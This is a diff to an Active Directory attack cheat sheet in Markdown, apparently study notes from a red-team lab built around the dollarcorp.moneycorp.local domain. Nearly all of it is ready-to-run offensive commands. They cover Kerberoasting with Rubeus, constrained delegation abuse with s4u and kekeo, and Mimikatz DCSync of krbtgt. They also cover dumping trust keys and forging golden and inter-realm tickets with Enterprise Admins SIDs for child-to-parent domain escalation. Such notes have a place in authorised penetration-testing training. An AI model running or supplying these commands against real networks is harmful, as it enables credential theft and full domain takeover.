@@ -9,13 +9,13 @@
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
 * [DNS Admins](#DNS-Admins) 
-* [Child to parent attacks](#Child-to-parent-attacks) 
-  * [Trust tickets](#Trust-tickets)
-  * [Krbtgt hash](#Krbtgt-hash)
+* [Enterprise Admins](#Enterprise-Admins) 
+  * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
+  * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
 * [Crossforest attacks](#Crossforest-attacks)
   * [Kerberoast](#Kerberoast2)
   * [Trust flow](#Trust-flow) 
-* [Trust abuse SQL](#Trust-abuse-SQL) 
+  * [Trust abuse SQL](#Trust-abuse-SQL) 
 
 ## Kerberoast
 - https://github.com/GhostPack/Rubeus
@@ -30,7 +30,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ```
-./Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /stats
 ```
 
 #### Reguest a TGS
@@ -40,12 +40,12 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 ```
 
 ```
-Request-SPNTicket "<SPN>"
+Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 
 ```
-./Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain:<FQDN DOMAIN> /outfile:kerberoast_hashes.txt
-./Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple
+Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
 ```
 
 #### Request TGS Avoid detection
@@ -183,6 +183,7 @@ Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputC
 
 #### Discover domain computers which have unconstrained delegation
 - Domain Controllers always show up, ignore them
+- Use the ```-domain``` flag to check for other domain
 ```
 Get-DomainComputer -UnConstrained
 Get-DomainComputer -UnConstrained | select samaccountname
@@ -215,7 +216,7 @@ Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' mac
 
 #### Run DCSync to get credentials:
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 ### Printer bug
@@ -230,18 +231,32 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 ### Constrained Delegation
 - To execute attack owning the user or server with constrained delegation is required.
 #### Enumerate users with contrained delegation enabled
+- Use the -domain flag to check for other domain
 ```
 Get-DomainUser -TrustedToAuth
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 #### Enumerate computers with contrained delegation enabled
+- Use the -domain flag to check for other domain
 ```
 Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 ### Constrained delegation User
+#### Rubeus request and inject TGT + TGS
+```
+Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
+
+Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:ldap /<SERVER FQDN> /ptt
+```
+
+#### Run DCSync to get credentials:
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
 #### Requesting TGT with kekeo
 ```
 ./kekeo.exe
@@ -249,18 +264,14 @@ Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
 ```
 
 #### Requesting TGS with kekeo
+
 ```
-Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<SERVER FQDN>|HTTP/<SERVER FQDN>
+Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
 ```
 
 #### Use Mimikatz to inject the TGS ticket
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
-```
-
-#### Rubeus request and inject TGT + TGS
-```
-Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:CIFS/<SERVER FQDN> /altservice:HTTP /<SERVER FQDN> /ptt
 ```
 
 #### Now you can execute commands on the server
@@ -303,57 +314,60 @@ Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
 
-## Child to parent attacks
-### Trust tickets
+## Enterprise Admins
+### Child to parent - trust tickets
+- Abuses SID History
 #### Dump trust keys
-Look for in trust key from child to parent (first command) - This worked best for me! Second command didnt work :(
-Look for NTLM hash (second command)
+- Look for in trust key from child to parent (first command)
 ```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
 
 #### Create an inter-realm TGT
+- Uses well know Enterprise Admins SIDS
 ```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
-```
-
-#### Create a TGS for a service (kekeo_old)
-```
-./asktgs.exe <kirbi file> CIFS/<forest dc name>
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:S-1-5-21-2781415573-
+3701854478-2406986946-519 /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PAARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
 
-#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
+#### Create a TGS for a service (kekeo_old and new)
 ```
-./kirbikator.exe lsa .\<kirbi file>
+tgs::ask /tgt:<KIRBI FILE> /service:CIFS/<FQDN PARENT DC>
+./asktgs.exe <KIRBI FILE> CIFS/<FQDN PARENT DC>
+```
+
+#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
+```
+./kirbikator.exe lsa .\<KIRBI FILE>
+misc::convert lsa <KIRBI FILE>
 ```
 
 #### Check access to server
 ```
-ls \\<servername>\c$ 
+dir \\<FQDN PARENT DC>\C$ 
 ```
 
-### Krbtgt hash
+### Child to parent - krbtgt hash
+- Abuses SID History
 #### Get krbtgt hash from dc
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 ```
 
-#### Create TGT
-the mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
+#### Create TGT and inject in current session
+- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /sids:<sids> /krbtgt:<hash> /ticket:<path to save ticket>"'
-```
-
-#### Inject the ticket
-```
-Invoke-Mimikatz -Command '"kerberos::ptt <path to ticket>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /krbtgt:<HASH> /ptt"'
 ```
 
-#### Get SID of enterprise admin
+#### Check access to server
 ```
-Get-NetGroup -Domain <domain> -GroupName "Enterprise Admins" -FullData | select samaccountname, objectsid
+dir \\<FQDN PARENT DC>\C$ 
 ```
+
+#### Enter pssession to server!
 
 ## Crossforest attacks
 ### Kerberoast2
@@ -394,7 +408,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain>
 ls \\<servername>\<share>\
 ```
 
-## Trust Abuse SQL
+### Trust abuse SQL
 ```
 . .\PowerUpSQL.ps1
 ```
